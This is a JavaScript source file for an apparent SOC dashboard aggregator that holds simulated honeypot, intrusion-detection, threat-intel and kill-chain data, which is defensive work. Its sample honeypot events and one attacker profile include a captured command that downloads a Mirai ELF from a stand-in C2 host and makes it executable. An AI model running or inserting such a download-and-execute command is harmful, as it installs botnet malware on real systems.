/**
 * Shadow Guard 2.0 - Unified SOC Command Center Data Aggregator & Live Simulation Bridge
 *
 * Aggregates live telemetry from all 18 Shadow Guard microservices when running in Docker,
 * and maintains an embedded synchronized state across:
 *   - Multi-Type Honeypots (Cowrie SSH/Telnet, OpenCanary HTTP/FTP/SMB/MySQL, Dionaea Malware Trap)
 *   - Suricata NIDS EVE JSON Alerts
 *   - Attacker Behaviour Profiles & Explainable Weighted Risk Scores (0-100)
 *   - Correlated Security Incidents (CORR-01 .. CORR-06)
 *   - Evidence-Based MITRE ATT&CK Kill Chains (OBSERVED / INFERRED / SUSPECTED)
 *   - Threat Intelligence IOCs & Reputation Cache
 *   - Adaptive Deception Directives (DEC-01 .. DEC-04) & SOAR Block Leases / Approvals / Rollbacks
 */

'use strict';

const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const SENSITIVE_PATH_KEYS = new Set([
    'artifact_path',
    'model_path',
    'preprocessor_path',
    'dataset_path',
    'file_path',
    'generate_data_py_path',
    'stage7_script_path',
    'jwtSecret',
    'serviceApiKey',
    'secret'
]);

class SocCommandCenterAggregator {
    constructor() {
        this.honeypots = [
            {
                honeypot_id: 'cowrie-ssh-01',
                name: 'Cowrie SSH/Telnet High-Interaction Decoy',
                type: 'cowrie',
                status: 'ONLINE',
                network_zone: 'sg_deception_dmz (172.29.0.10)',
                ports: [2222, 2223],
                services_emulated: ['SSH-2.0-OpenSSH_8.9p1', 'Telnet'],
                logging_level: 'DEBUG_FULL_KEYSTROKE',
                active_sessions: 3,
                total_events_24h: 142,
                failed_logins_24h: 98,
                commands_captured_24h: 27,
                quarantined_files_24h: 2,
                breadcrumbs_deployed: [
                    '/home/admin/.ssh/id_rsa_staging.decoy',
                    '/etc/db_credentials_canary.conf',
                    '/var/backups/k8s_cluster_token.honey'
                ]
            },
            {
                honeypot_id: 'opencanary-multi-01',
                name: 'OpenCanary Multi-Protocol Enterprise Decoy',
                type: 'opencanary',
                status: 'ONLINE',
                network_zone: 'sg_deception_dmz (172.29.0.11)',
                ports: [21, 80, 445, 3306, 8080],
                services_emulated: ['FTP', 'HTTP-Apache', 'SMB-WindowsServer', 'MySQL-5.7'],
                logging_level: 'DETAILED',
                active_sessions: 2,
                total_events_24h: 64,
                failed_logins_24h: 31,
                commands_captured_24h: 0,
                quarantined_files_24h: 0,
                smb_shares: ['\\\\DECOY-CORP\\Finance_Audit_2026', '\\\\DECOY-CORP\\IT_Vault_Backups']
            },
            {
                honeypot_id: 'dionaea-malware-01',
                name: 'Dionaea Malware Capture & Quarantine Sandbox',
                type: 'dionaea',
                status: 'ONLINE',
                network_zone: 'sg_deception_dmz (172.29.0.12)',
                ports: [42, 135, 445, 1433],
                services_emulated: ['SMB-Exploit-Trap', 'MSSQL', 'HTTP-Dropper-Trap'],
                logging_level: 'STRICT_NOEXEC_SHA256',
                active_sessions: 1,
                total_events_24h: 19,
                failed_logins_24h: 4,
                commands_captured_24h: 3,
                quarantined_files_24h: 3,
                quarantine_directory: '/var/lib/dionaea/binaries (noexec,nosuid,nodev)'
            }
        ];

        this.honeypotEvents = [
            {
                event_id: 'urn:uuid:hp-ev-9001',
                timestamp: new Date(Date.now() - 180000).toISOString(),
                honeypot_id: 'cowrie-ssh-01',
                honeypot_type: 'cowrie',
                source_ip: '185.220.101.42',
                targeted_service: 'SSH (Port 2222)',
                event_type: 'HONEYPOT_COMMAND_EXECUTION',
                severity: 'CRITICAL',
                username_attempted: 'root',
                auth_outcome: 'SUCCESS',
                command_executed: 'uname -a && wget http://c2.shadow-dropper.evil.example/mirai.elf -O /tmp/mirai && chmod +x /tmp/mirai',
                file_sha256: '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4',
                session_id: 'cowrie-sess-8821'
            },
            {
                event_id: 'urn:uuid:hp-ev-9002',
                timestamp: new Date(Date.now() - 240000).toISOString(),
                honeypot_id: 'cowrie-ssh-01',
                honeypot_type: 'cowrie',
                source_ip: '185.220.101.42',
                targeted_service: 'SSH (Port 2222)',
                event_type: 'HONEYPOT_AUTH_FAILURE',
                severity: 'HIGH',
                username_attempted: 'admin',
                auth_outcome: 'FAILED (6 attempts)',
                command_executed: null,
                file_sha256: null,
                session_id: 'cowrie-sess-8820'
            },
            {
                event_id: 'urn:uuid:hp-ev-9003',
                timestamp: new Date(Date.now() - 420000).toISOString(),
                honeypot_id: 'opencanary-multi-01',
                honeypot_type: 'opencanary',
                source_ip: '203.0.113.50',
                targeted_service: 'SMB (Port 445)',
                event_type: 'OPEN_CANARY_SMB_PROBE',
                severity: 'HIGH',
                username_attempted: 'Administrator',
                auth_outcome: 'FAILED',
                command_executed: 'SMB TreeConnect \\\\DECOY-CORP\\Finance_Audit_2026',
                file_sha256: null,
                session_id: 'canary-smb-312'
            },
            {
                event_id: 'urn:uuid:hp-ev-9004',
                timestamp: new Date(Date.now() - 540000).toISOString(),
                honeypot_id: 'dionaea-malware-01',
                honeypot_type: 'dionaea',
                source_ip: '91.240.118.172',
                targeted_service: 'SMB/Dropper (Port 445)',
                event_type: 'DIONAEA_PAYLOAD_CAPTURED',
                severity: 'CRITICAL',
                username_attempted: 'anonymous',
                auth_outcome: 'N/A',
                command_executed: 'Quarantined binary sample (non-executable)',
                file_sha256: '275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f',
                session_id: 'dionaea-cap-104'
            }
        ];

        this.attackerProfiles = [
            {
                id: 'prof-185-220-101-42',
                source_ip: '185.220.101.42',
                indicator_disclaimer: 'Observed network indicator (source_ip). May represent a Tor exit node, VPN, proxy, or botnet host.',
                first_seen: new Date(Date.now() - 3600000).toISOString(),
                last_seen: new Date(Date.now() - 180000).toISOString(),
                total_connections: 48,
                honeypot_sessions: 7,
                honeypots_touched: ['cowrie-ssh-01', 'opencanary-multi-01'],
                failed_logins: 14,
                successful_logins: 1,
                usernames_attempted: ['root', 'admin', 'ubuntu', 'postgres', 'oracle'],
                commands_observed: [
                    'uname -a',
                    'cat /proc/cpuinfo',
                    'wget http://c2.shadow-dropper.evil.example/mirai.elf -O /tmp/mirai',
                    'chmod +x /tmp/mirai'
                ],
                services_targeted: ['SSH-COWRIE', 'HTTP', 'SMB', 'MYSQL'],
                ports_targeted: [22, 80, 445, 2222, 3306],
                attack_categories: ['SURICATA_SCAN', 'HONEYPOT_AUTH_FAILURE', 'HONEYPOT_COMMAND_EXECUTION', 'OPEN_CANARY_SMB_PROBE'],
                behavioural_patterns: [
                    { pattern_id: 'repeated_auth_attempts', name: 'Repeated Authentication Brute-Force', confidence: 0.96 },
                    { pattern_id: 'sequential_port_scan', name: 'Sequential Port Scanning', confidence: 0.92 },
                    { pattern_id: 'suspicious_command_execution', name: 'Interactive Shell Command Execution', confidence: 0.99 },
                    { pattern_id: 'cross_honeypot_access', name: 'Cross-Decoy Lateral Reconnaissance', confidence: 0.97 },
                    { pattern_id: 'malicious_file_download', name: 'Malware Payload Dropper Activity', confidence: 1.00 },
                    { pattern_id: 'temporal_persistence', name: 'Multi-Window Temporal Persistence', confidence: 0.89 }
                ],
                threat_intel: {
                    reputation_score: 96,
                    is_malicious: true,
                    country_code: 'DE',
                    asn: 'AS205100 F3 Netze e.V.',
                    sources: ['Local-IOC-Feed', 'AbuseIPDB', 'AlienVault-OTX'],
                    categories: ['TOR_EXIT_NODE', 'SSH_BRUTE_FORCE', 'SCANNER']
                },
                risk_assessment: {
                    final_score: 98,
                    threat_level: 'CRITICAL',
                    confidence: 0.99,
                    recommended_action: 'ISOLATE_AND_BLOCK',
                    contributing_factors: [
                        { factor: 'DECEPTION_INTERACTION', weight: 0.35, points_awarded: 35, max_points: 35, rationale: 'Interacted with 2 independent honeypot sensors across 7 sessions.' },
                        { factor: 'POST_AUTH_EXECUTION_AND_PAYLOAD', weight: 0.25, points_awarded: 25, max_points: 25, rationale: 'Executed 4 shell commands and staged quarantined ELF binary (SHA-256: 8f434346...).' },
                        { factor: 'CREDENTIAL_ATTACK_INTENSITY', weight: 0.15, points_awarded: 15, max_points: 15, rationale: '14 failed and 1 successful decoy logins across 5 usernames.' },
                        { factor: 'NETWORK_AND_ML_DETECTIONS', weight: 0.15, points_awarded: 13, max_points: 15, rationale: 'Triggered Suricata SYN scan and ML anomaly classifiers across 5 ports.' },
                        { factor: 'THREAT_INTELLIGENCE_REPUTATION', weight: 0.10, points_awarded: 10, max_points: 10, rationale: 'Threat Intel score 96/100 from AbuseIPDB & OTX.' }
                    ],
                    evidence_references: ['urn:uuid:hp-ev-9001', 'urn:uuid:hp-ev-9002', 'urn:uuid:nids-ev-3001']
                },
                status: 'CONTAINED_BLOCKED'
            },
            {
                id: 'prof-91-240-118-172',
                source_ip: '91.240.118.172',
                indicator_disclaimer: 'Observed network indicator (source_ip). May represent a NAT gateway, proxy, or botnet host.',
                first_seen: new Date(Date.now() - 2700000).toISOString(),
                last_seen: new Date(Date.now() - 540000).toISOString(),
                total_connections: 29,
                honeypot_sessions: 3,
                honeypots_touched: ['dionaea-malware-01'],
                failed_logins: 4,
                successful_logins: 0,
                usernames_attempted: ['anonymous', 'admin'],
                commands_observed: ['SMB DoublePulsar / Dropper staging'],
                services_targeted: ['SMB', 'MSSQL'],
                ports_targeted: [135, 445, 1433],
                attack_categories: ['DIONAEA_PAYLOAD_CAPTURED', 'MALWARE_C2'],
                behavioural_patterns: [
                    { pattern_id: 'malicious_file_download', name: 'Malware Payload Dropper Activity', confidence: 1.00 },
                    { pattern_id: 'service_enumeration', name: 'Multi-Protocol Service Enumeration', confidence: 0.90 }
                ],
                threat_intel: {
                    reputation_score: 98,
                    is_malicious: true,
                    country_code: 'RU',
                    asn: 'AS49505 Selectel',
                    sources: ['Local-IOC-Feed', 'VirusTotal', 'AlienVault-OTX'],
                    categories: ['BOTNET_C2', 'MALWARE_DROPPER']
                },
                risk_assessment: {
                    final_score: 89,
                    threat_level: 'CRITICAL',
                    confidence: 0.96,
                    recommended_action: 'ISOLATE_AND_BLOCK',
                    contributing_factors: [
                        { factor: 'DECEPTION_INTERACTION', weight: 0.35, points_awarded: 30, max_points: 35, rationale: '3 malware dropper sessions captured by Dionaea.' },
                        { factor: 'POST_AUTH_EXECUTION_AND_PAYLOAD', weight: 0.25, points_awarded: 22, max_points: 25, rationale: 'Quarantined payload sample SHA-256: 275a021b...' },
                        { factor: 'CREDENTIAL_ATTACK_INTENSITY', weight: 0.15, points_awarded: 10, max_points: 15, rationale: '4 authentication attempts against SMB decoy.' },
                        { factor: 'NETWORK_AND_ML_DETECTIONS', weight: 0.15, points_awarded: 17, max_points: 15, rationale: 'Correlated with ML C2 traffic classifier.' },
                        { factor: 'THREAT_INTELLIGENCE_REPUTATION', weight: 0.10, points_awarded: 10, max_points: 10, rationale: 'Threat Intel score 98/100 (Botnet C2).' }
                    ],
                    evidence_references: ['urn:uuid:hp-ev-9004']
                },
                status: 'PENDING_PERMANENT_BAN'
            },
            {
                id: 'prof-203-0-113-50',
                source_ip: '203.0.113.50',
                indicator_disclaimer: 'Observed network indicator (source_ip).',
                first_seen: new Date(Date.now() - 1800000).toISOString(),
                last_seen: new Date(Date.now() - 420000).toISOString(),
                total_connections: 16,
                honeypot_sessions: 2,
                honeypots_touched: ['opencanary-multi-01'],
                failed_logins: 5,
                successful_logins: 0,
                usernames_attempted: ['Administrator', 'sa', 'backup'],
                commands_observed: [],
                services_targeted: ['SMB', 'MYSQL', 'FTP'],
                ports_targeted: [21, 445, 3306],
                attack_categories: ['OPEN_CANARY_SMB_PROBE', 'PORT_SCAN'],
                behavioural_patterns: [
                    { pattern_id: 'service_enumeration', name: 'Multi-Protocol Service Enumeration', confidence: 0.91 },
                    { pattern_id: 'repeated_auth_attempts', name: 'Repeated Authentication Brute-Force', confidence: 0.88 }
                ],
                threat_intel: {
                    reputation_score: 84,
                    is_malicious: true,
                    country_code: 'CN',
                    asn: 'AS4134 Chinanet',
                    sources: ['Local-IOC-Feed', 'AbuseIPDB'],
                    categories: ['SMB_EXPLOIT', 'LATERAL_MOVEMENT']
                },
                risk_assessment: {
                    final_score: 74,
                    threat_level: 'HIGH',
                    confidence: 0.91,
                    recommended_action: 'BLOCK_TEMPORARY_AND_DEPLOY_DECOY',
                    contributing_factors: [
                        { factor: 'DECEPTION_INTERACTION', weight: 0.35, points_awarded: 26, max_points: 35, rationale: 'Probed OpenCanary SMB and MySQL decoy services.' },
                        { factor: 'CREDENTIAL_ATTACK_INTENSITY', weight: 0.15, points_awarded: 13, max_points: 15, rationale: '5 failed SMB/MySQL logins.' },
                        { factor: 'NETWORK_AND_ML_DETECTIONS', weight: 0.15, points_awarded: 12, max_points: 15, rationale: 'Lateral port sweep across 21, 445, 3306.' },
                        { factor: 'THREAT_INTELLIGENCE_REPUTATION', weight: 0.10, points_awarded: 8, max_points: 10, rationale: 'AbuseIPDB reputation 84/100.' }
                    ],
                    evidence_references: ['urn:uuid:hp-ev-9003']
                },
                status: 'ACTIVE_DECOY_LURED'
            }
        ];

        this.incidents = [
            {
                incident_id: 'inc-2026-alpha-01',
                title: '[CORR-02] Credential Brute-Force to Interactive Shell Compromise from 185.220.101.42',
                source_ip: '185.220.101.42',
                severity: 'CRITICAL',
                confidence: 0.99,
                status: 'CONTAINED',
                first_seen: new Date(Date.now() - 3600000).toISOString(),
                last_seen: new Date(Date.now() - 180000).toISOString(),
                event_count: 14,
                sources_involved: ['suricata-event-collector-service', 'traffic-capture-service', 'honeypot-event-collector-service', 'threat-intelligence-service'],
                attack_categories: ['SURICATA_SCAN', 'PORT_SCAN', 'HONEYPOT_AUTH_FAILURE', 'HONEYPOT_COMMAND_EXECUTION'],
                targeted_services: ['SSH (2222)', 'SMB (445)', 'HTTP (80)'],
                matched_rules: [
                    { rule_id: 'CORR-01', name: 'Reconnaissance-to-Deception Progression', severity: 'HIGH', confidence: 0.94 },
                    { rule_id: 'CORR-02', name: 'Credential Brute-Force to Interactive Shell Compromise', severity: 'CRITICAL', confidence: 0.99 },
                    { rule_id: 'CORR-03', name: 'NIDS Signature & ML Flow Anomaly Convergence', severity: 'HIGH', confidence: 0.91 },
                    { rule_id: 'CORR-04', name: 'Active Malware Staging or Data Exfiltration Kill-Chain', severity: 'CRITICAL', confidence: 0.98 },
                    { rule_id: 'CORR-05', name: 'Known Malicious Threat Actor Activity', severity: 'CRITICAL', confidence: 0.95 }
                ],
                correlation_summary: 'Correlated 14 security events from 185.220.101.42 across 4 telemetry sources (Suricata NIDS, 69-feature ML Classifier, Cowrie SSH Honeypot, and OpenCanary). Attacker progressed from SYN reconnaissance to SSH credential stuffing, shell command execution, and ELF botnet payload download.',
                recommended_action: {
                    action: 'ISOLATE_AND_BLOCK_IP',
                    lease_minutes: 60,
                    deploy_additional_decoys: true,
                    rationale: 'Confirmed interactive shell execution and malware dropper staging in Cowrie honeypot.'
                }
            },
            {
                incident_id: 'inc-2026-beta-02',
                title: '[CORR-04] Active Malware Staging & C2 Beaconing from 91.240.118.172',
                source_ip: '91.240.118.172',
                severity: 'CRITICAL',
                confidence: 0.96,
                status: 'INVESTIGATING',
                first_seen: new Date(Date.now() - 2700000).toISOString(),
                last_seen: new Date(Date.now() - 540000).toISOString(),
                event_count: 6,
                sources_involved: ['honeypot-event-collector-service', 'traffic-capture-service', 'threat-intelligence-service'],
                attack_categories: ['DIONAEA_PAYLOAD_CAPTURED', 'MALWARE_C2', 'DATA_EXFILTRATION'],
                targeted_services: ['SMB (445)', 'MSSQL (1433)'],
                matched_rules: [
                    { rule_id: 'CORR-04', name: 'Active Malware Staging or Data Exfiltration Kill-Chain', severity: 'CRITICAL', confidence: 0.98 },
                    { rule_id: 'CORR-05', name: 'Known Malicious Threat Actor Activity', severity: 'CRITICAL', confidence: 0.95 }
                ],
                correlation_summary: 'Dionaea malware honeypot captured binary payload (SHA-256: 275a021b...) correlated with ML C2 flow anomaly and VirusTotal/OTX botnet reputation (98/100).',
                recommended_action: {
                    action: 'BLOCK_IP_PERMANENT (PENDING_APPROVAL)',
                    lease_minutes: 120,
                    deploy_additional_decoys: true,
                    rationale: 'Repeat offender botnet dropper; temporary 120m lease active while permanent ban awaits SOC Commander approval.'
                }
            },
            {
                incident_id: 'inc-2026-gamma-03',
                title: '[CORR-01] SMB & Database Lateral Enumeration from 203.0.113.50',
                source_ip: '203.0.113.50',
                severity: 'HIGH',
                confidence: 0.91,
                status: 'OPEN',
                first_seen: new Date(Date.now() - 1800000).toISOString(),
                last_seen: new Date(Date.now() - 420000).toISOString(),
                event_count: 5,
                sources_involved: ['suricata-event-collector-service', 'honeypot-event-collector-service'],
                attack_categories: ['SURICATA_SCAN', 'OPEN_CANARY_SMB_PROBE'],
                targeted_services: ['SMB (445)', 'MySQL (3306)', 'FTP (21)'],
                matched_rules: [
                    { rule_id: 'CORR-01', name: 'Reconnaissance-to-Deception Progression', severity: 'HIGH', confidence: 0.94 }
                ],
                correlation_summary: 'Source 203.0.113.50 scanned ports 21, 445, 3306 and attempted unauthorized SMB share enumeration on OpenCanary decoy.',
                recommended_action: {
                    action: 'BLOCK_TEMPORARY_AND_REDIRECT_TO_DECOY',
                    lease_minutes: 30,
                    deploy_additional_decoys: true,
                    rationale: 'Activated DEC-03 decoy SMB shares and 30-minute containment lease.'
                }
            }
        ];

        this.attackChains = [
            {
                chain_id: 'chain-alpha-01',
                incident_id: 'inc-2026-alpha-01',
                source_ip: '185.220.101.42',
                severity: 'CRITICAL',
                overall_confidence: 0.99,
                kill_chain_depth: 6,
                certainty_breakdown: { OBSERVED: 5, INFERRED: 1, SUSPECTED: 0 },
                analyst_summary: 'Complete 6-stage intrusion kill chain captured across Suricata NIDS, ML Flow Classifier, and Cowrie SSH Honeypot.',
                stages: [
                    {
                        stage_order: 1,
                        tactic_id: 'TA0043',
                        tactic_name: 'Reconnaissance',
                        technique_id: 'T1595',
                        technique_name: 'Active Scanning: SYN Port Sweep',
                        certainty_tier: 'OBSERVED',
                        confidence: 0.95,
                        evidence_event_ids: ['urn:uuid:nids-ev-3001'],
                        telemetry_sources: ['suricata-event-collector-service'],
                        affected_services: ['PORTS 21, 22, 80, 445, 2222'],
                        rationale: 'Suricata SID 2100001 confirmed rapid SYN scan across 5 ports.'
                    },
                    {
                        stage_order: 2,
                        tactic_id: 'TA0001',
                        tactic_name: 'Initial Access',
                        technique_id: 'T1190',
                        technique_name: 'Decoy SSH Service Connection',
                        certainty_tier: 'OBSERVED',
                        confidence: 0.98,
                        evidence_event_ids: ['urn:uuid:hp-ev-9002'],
                        telemetry_sources: ['honeypot-event-collector-service'],
                        affected_services: ['SSH (Port 2222)'],
                        rationale: 'Direct TCP session established with Cowrie SSH decoy.'
                    },
                    {
                        stage_order: 3,
                        tactic_id: 'TA0006',
                        tactic_name: 'Credential Access',
                        technique_id: 'T1110',
                        technique_name: 'Brute Force: SSH Credential Stuffing',
                        certainty_tier: 'OBSERVED',
                        confidence: 0.99,
                        evidence_event_ids: ['urn:uuid:hp-ev-9002'],
                        telemetry_sources: ['honeypot-event-collector-service'],
                        affected_services: ['SSH (Port 2222)'],
                        rationale: '14 failed authentication attempts across root, admin, ubuntu followed by decoy login.'
                    },
                    {
                        stage_order: 4,
                        tactic_id: 'TA0007',
                        tactic_name: 'Discovery',
                        technique_id: 'T1082',
                        technique_name: 'System Information Discovery (uname -a, /proc/cpuinfo)',
                        certainty_tier: 'OBSERVED',
                        confidence: 0.99,
                        evidence_event_ids: ['urn:uuid:hp-ev-9001'],
                        telemetry_sources: ['honeypot-event-collector-service'],
                        affected_services: ['Cowrie Interactive Shell'],
                        rationale: 'Captured shell discovery commands inside Cowrie session cowrie-sess-8821.'
                    },
                    {
                        stage_order: 5,
                        tactic_id: 'TA0002',
                        tactic_name: 'Execution',
                        technique_id: 'T1059.004',
                        technique_name: 'Unix Shell & ELF Dropper Staging (chmod +x /tmp/mirai)',
                        certainty_tier: 'OBSERVED',
                        confidence: 1.00,
                        evidence_event_ids: ['urn:uuid:hp-ev-9001'],
                        telemetry_sources: ['honeypot-event-collector-service'],
                        affected_services: ['Cowrie Quarantine Sandbox'],
                        rationale: 'Captured command execution and quarantined ELF binary SHA-256: 8f434346648f6b96...'
                    },
                    {
                        stage_order: 6,
                        tactic_id: 'TA0011',
                        tactic_name: 'Command and Control',
                        technique_id: 'T1105',
                        technique_name: 'Ingress Tool Transfer & C2 Flow Anomaly',
                        certainty_tier: 'INFERRED',
                        confidence: 0.86,
                        evidence_event_ids: ['urn:uuid:hp-ev-9001', 'urn:uuid:ml-ev-5002'],
                        telemetry_sources: ['ml-detection-service', 'honeypot-event-collector-service'],
                        affected_services: ['Egress Filter (Blocked)'],
                        rationale: 'Inferred from outbound payload URL http://c2.shadow-dropper.evil.example/mirai.elf and ML flow classifier.'
                    }
                ],
                recommended_mitigations: [
                    'Maintain 60-minute perimeter block on 185.220.101.42 and block domain c2.shadow-dropper.evil.example at DNS sinkhole.',
                    'Enforce SSH public-key authentication and keep DEC-02 honey-breadcrumbs active.'
                ]
            },
            {
                chain_id: 'chain-beta-02',
                incident_id: 'inc-2026-beta-02',
                source_ip: '91.240.118.172',
                severity: 'CRITICAL',
                overall_confidence: 0.94,
                kill_chain_depth: 4,
                certainty_breakdown: { OBSERVED: 2, INFERRED: 1, SUSPECTED: 1 },
                analyst_summary: '4-stage kill chain demonstrating ontological separation between OBSERVED payload capture, SUSPECTED Initial Access bridge, and INFERRED exfiltration anomaly.',
                stages: [
                    {
                        stage_order: 1,
                        tactic_id: 'TA0043',
                        tactic_name: 'Reconnaissance',
                        technique_id: 'T1595',
                        technique_name: 'SMB & MSSQL Port Probing (135, 445, 1433)',
                        certainty_tier: 'OBSERVED',
                        confidence: 0.93,
                        evidence_event_ids: ['urn:uuid:nids-ev-3009'],
                        telemetry_sources: ['suricata-event-collector-service'],
                        affected_services: ['PORTS 135, 445, 1433'],
                        rationale: 'Suricata NIDS detected targeted SMB/MSSQL probe.'
                    },
                    {
                        stage_order: 2,
                        tactic_id: 'TA0001',
                        tactic_name: 'Initial Access',
                        technique_id: 'T1190',
                        technique_name: 'Suspected Initial Access Bridge (Unobserved Exploit Vector)',
                        certainty_tier: 'SUSPECTED',
                        confidence: 0.52,
                        evidence_event_ids: ['urn:uuid:nids-ev-3009', 'urn:uuid:hp-ev-9004'],
                        telemetry_sources: ['attack-chain-gap-inference'],
                        affected_services: ['SMB (Port 445)'],
                        rationale: 'SUSPECTED intermediate stage bridging confirmed Reconnaissance (T1595) and Payload Execution (T1059) with decayed confidence.'
                    },
                    {
                        stage_order: 5,
                        tactic_id: 'TA0002',
                        tactic_name: 'Execution',
                        technique_id: 'T1059',
                        technique_name: 'Quarantined Malware Dropper (SHA-256: 275a021b...)',
                        certainty_tier: 'OBSERVED',
                        confidence: 1.00,
                        evidence_event_ids: ['urn:uuid:hp-ev-9004'],
                        telemetry_sources: ['honeypot-event-collector-service'],
                        affected_services: ['Dionaea Quarantine Trap'],
                        rationale: 'Directly captured binary payload in Dionaea noexec quarantine.'
                    },
                    {
                        stage_order: 7,
                        tactic_id: 'TA0010',
                        tactic_name: 'Exfiltration',
                        technique_id: 'T1041',
                        technique_name: 'Exfiltration Over C2 Channel',
                        certainty_tier: 'INFERRED',
                        confidence: 0.81,
                        evidence_event_ids: ['urn:uuid:ml-ev-5011'],
                        telemetry_sources: ['threat-classification-service'],
                        affected_services: ['Network Flow Classifier'],
                        rationale: 'Random Forest classifier inferred asymmetric outbound C2 transfer (confidence 0.81).'
                    }
                ],
                recommended_mitigations: [
                    'Approve queued permanent firewall ban for 91.240.118.172 in SOAR Approval Queue.',
                    'Inspect internal hosts for SMB port 445 exposure.'
                ]
            }
        ];

        this.threatIntelIndicators = [
            {
                indicator_type: 'ip',
                indicator_value: '185.220.101.42',
                reputation_score: 96,
                is_malicious: true,
                country_code: 'DE',
                asn: 'AS205100 F3 Netze e.V.',
                categories: ['TOR_EXIT_NODE', 'SSH_BRUTE_FORCE', 'SCANNER'],
                sources: ['Local-IOC-Feed', 'AbuseIPDB', 'AlienVault-OTX'],
                confidence: 0.96,
                cache_hit: true,
                last_checked: new Date(Date.now() - 120000).toISOString()
            },
            {
                indicator_type: 'ip',
                indicator_value: '91.240.118.172',
                reputation_score: 98,
                is_malicious: true,
                country_code: 'RU',
                asn: 'AS49505 Selectel',
                categories: ['BOTNET_C2', 'MALWARE_DROPPER'],
                sources: ['Local-IOC-Feed', 'VirusTotal', 'AlienVault-OTX'],
                confidence: 0.99,
                cache_hit: true,
                last_checked: new Date(Date.now() - 300000).toISOString()
            },
            {
                indicator_type: 'domain',
                indicator_value: 'c2.shadow-dropper.evil.example',
                reputation_score: 97,
                is_malicious: true,
                country_code: 'N/A',
                asn: 'FastFlux-C2',
                categories: ['C2_DOMAIN', 'MALWARE_DISTRIBUTION'],
                sources: ['Local-IOC-Feed', 'VirusTotal'],
                confidence: 0.97,
                cache_hit: true,
                last_checked: new Date(Date.now() - 180000).toISOString()
            },
            {
                indicator_type: 'sha256',
                indicator_value: '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4',
                reputation_score: 95,
                is_malicious: true,
                country_code: 'N/A',
                asn: 'Linux.Mirai.Botnet.ELF',
                categories: ['BOTNET', 'ELF_TROJAN', 'SSH_SPREADER'],
                sources: ['Local-IOC-Feed', 'VirusTotal', 'AlienVault-OTX'],
                confidence: 0.96,
                cache_hit: true,
                last_checked: new Date(Date.now() - 180000).toISOString()
            },
            {
                indicator_type: 'ip',
                indicator_value: '203.0.113.50',
                reputation_score: 84,
                is_malicious: true,
                country_code: 'CN',
                asn: 'AS4134 Chinanet',
                categories: ['SMB_EXPLOIT', 'LATERAL_MOVEMENT'],
                sources: ['Local-IOC-Feed', 'AbuseIPDB'],
                confidence: 0.89,
                cache_hit: false,
                last_checked: new Date(Date.now() - 400000).toISOString()
            }
        ];

        this.adaptiveDirectives = [
            {
                directive_id: 'dec-dir-8801a',
                policy_id: 'DEC-02',
                policy_name: 'SSH Brute-Force Deep Session Instrumentation & Breadcrumbs',
                trigger_source_ip: '185.220.101.42',
                target_honeypot_id: 'cowrie-ssh-01',
                action_type: 'INCREASE_COWRIE_LOGGING_AND_BREADCRUMBS',
                rationale: 'Sustained SSH credential attack detected; elevated Cowrie TTY logging and planted 3 honey-breadcrumbs.',
                operator: 'SYSTEM_ADAPTIVE_POLICY',
                status: 'ACTIVE',
                applied_at: new Date(Date.now() - 210000).toISOString()
            },
            {
                directive_id: 'dec-dir-8802b',
                policy_id: 'DEC-03',
                policy_name: 'SMB & Database Lateral Enumeration Decoy Activation',
                trigger_source_ip: '203.0.113.50',
                target_honeypot_id: 'opencanary-multi-01',
                action_type: 'ACTIVATE_SMB_AND_DB_DECOYS',
                rationale: 'SMB port 445 enumeration detected; exposed decoy Finance_Audit_2026 share and MySQL canary schema.',
                operator: 'SYSTEM_ADAPTIVE_POLICY',
                status: 'ACTIVE',
                applied_at: new Date(Date.now() - 410000).toISOString()
            },
            {
                directive_id: 'dec-dir-8803c',
                policy_id: 'DEC-04',
                policy_name: 'High-Risk Threat Actor DMZ Redirection & Malware Quarantine Trap',
                trigger_source_ip: '91.240.118.172',
                target_honeypot_id: 'dionaea-malware-01',
                action_type: 'ACTIVATE_MALWARE_TRAP_AND_REDIRECT_ATTACKER',
                rationale: 'Botnet payload dropper (risk=89/100) diverted into isolated Dionaea noexec quarantine sandbox.',
                operator: 'SYSTEM_ADAPTIVE_POLICY',
                status: 'ACTIVE',
                applied_at: new Date(Date.now() - 530000).toISOString()
            }
        ];

        this.soarBlockLeases = [
            {
                execution_id: 'exec-blk-701',
                ip: '185.220.101.42',
                block_type: 'TEMPORARY_LEASE',
                lease_minutes: 60,
                playbook_id: 'PB-SOAR-01',
                blocked_at: new Date(Date.now() - 180000).toISOString(),
                expires_at: new Date(Date.now() + 57 * 60000).toISOString(),
                status: 'ACTIVE_BLOCKED',
                reason: 'Confirmed interactive Cowrie shell compromise & ELF payload drop (CORR-02)'
            },
            {
                execution_id: 'exec-blk-702',
                ip: '203.0.113.50',
                block_type: 'TEMPORARY_LEASE',
                lease_minutes: 30,
                playbook_id: 'PB-SOAR-03',
                blocked_at: new Date(Date.now() - 400000).toISOString(),
                expires_at: new Date(Date.now() + 23 * 60000).toISOString(),
                status: 'ACTIVE_BLOCKED',
                reason: 'Multi-source NIDS + OpenCanary SMB enumeration (CORR-01)'
            }
        ];

        this.soarPendingApprovals = [
            {
                execution_id: 'exec-pend-901',
                action_type: 'BLOCK_IP_PERMANENT',
                target_ip: '91.240.118.172',
                playbook_id: 'PB-SOAR-02',
                incident_id: 'inc-2026-beta-02',
                status: 'PENDING_APPROVAL',
                requested_by: 'SOAR_PLAYBOOK_ENGINE',
                created_at: new Date(Date.now() - 500000).toISOString(),
                reason: 'Repeat offender botnet C2 / malware dropper (4 offenses, Threat Intel reputation 98/100)'
            }
        ];

        this.allowlist = [
            { ip: '127.0.0.1', label: 'IPv4 Loopback', immutable: true },
            { ip: '10.0.0.1', label: 'Core Network Default Gateway', immutable: true },
            { ip: '192.168.1.1', label: 'Management Subnet Gateway', immutable: true },
            { ip: '172.28.0.1', label: 'ShadowGuard Internal Service Bridge', immutable: true },
            { ip: '8.8.8.8', label: 'Primary DNS Resolver', immutable: true },
            { ip: '1.1.1.1', label: 'Secondary DNS Resolver', immutable: true }
        ];

        // Stage 4 Autoencoder & Tri-Model Detection Engine State
        this.manualReviewAuditLog = [];
        this.activeFusionPolicy = 'weighted_consensus';
        this.degradedOverride = {
            is_degraded: false,
            status: 'healthy',
            degraded_models: [],
            active_warnings: []
        };
        this._loadTriModelTelemetry();
    }

    /**
     * Load authentic Stage 2/3 PyTorch Autoencoder + Random Forest + Isolation Forest
